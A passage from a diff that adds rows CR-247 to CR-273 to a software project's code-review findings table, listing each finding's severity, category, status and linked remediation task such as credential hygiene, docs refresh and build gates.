+| CR-247 | Low | Code quality | Open | [Task 55](review-tasks/55-frontend-constants-and-types.md) |
+| CR-248 | Low | Code quality | Open | [Task 53](review-tasks/53-app-shell-and-settings-dedup.md) |
+| CR-249 | Low | Code quality | Open | [Task 53](review-tasks/53-app-shell-and-settings-dedup.md) |
+| CR-250 | Low | Accessibility | Open | [Task 42](review-tasks/42-settings-forms.md) |
+| CR-251 | Low | Bug | Open | [Task 52](review-tasks/52-shared-ui-components.md) |
+| CR-252 | Low | Code quality | Open | [Task 52](review-tasks/52-shared-ui-components.md) |
+| CR-253 | Low | Code quality | Open | [Task 55](review-tasks/55-frontend-constants-and-types.md) |
+| CR-254 | Low | Security | Open | [Task 59](review-tasks/59-security-credential-hygiene.md) |
+| CR-255 | Low | Performance | Open | [Task 41](review-tasks/41-settings-data-and-errors.md) |
+| CR-256 | Low | Code quality | Open | [Task 41](review-tasks/41-settings-data-and-errors.md) |
+| CR-257 | Low | Infra | Open | [Task 02](review-tasks/02-typecheck-and-build-gates.md) |
+| CR-258 | Low | Infra | Open | [Task 51](review-tasks/51-tsconfig-strictness.md) |
+| CR-259 | Low | Code quality | Open | [Task 52](review-tasks/52-shared-ui-components.md) |
+| CR-260 | Low | Docs | Open | [Task 56](review-tasks/56-docs-refresh.md) |
+| CR-261 | Low | Docs | Open | [Task 56](review-tasks/56-docs-refresh.md) |
+| CR-262 | Low | Infra | Open | [Task 06](review-tasks/06-db-path-and-seed-safety.md) |
+| CR-263 | Low | Docs | Obsolete (legacy, no fix) | [Task 07](review-tasks/07-remove-dead-and-legacy-code.md) |
+| CR-264 | Low | Security | Open | [Task 59](review-tasks/59-security-credential-hygiene.md) |
+| CR-265 | Low | Security | Open | [Task 59](review-tasks/59-security-credential-hygiene.md) |
+| CR-266 | Low | Infra | Open | [Task 02](review-tasks/02-typecheck-and-build-gates.md) |
+| CR-267 | Low | Infra | Open | [Task 05](review-tasks/05-test-coverage-baseline.md) |
+| CR-268 | Low | Docs | Open | [Task 56](review-tasks/56-docs-refresh.md) |
+| CR-269 | Medium | Bug | Open | [Task 16](review-tasks/16-run-lifecycle-late-writes.md) |
+| CR-270 | High | Bug | Open | [Task 01](review-tasks/01-plan-artifact-ordering-hotfix.md) |
+| CR-271 | Medium | Gap | Open | [Task 15](review-tasks/15-frontend-mutation-conventions.md) |
+| CR-272 | Low | Bug | Open | [Task 06](review-tasks/06-db-path-and-seed-safety.md) |
+| CR-273 | Medium | Infra | Open | [Task 02](review-tasks/02-typecheck-and-build-gates.md) |
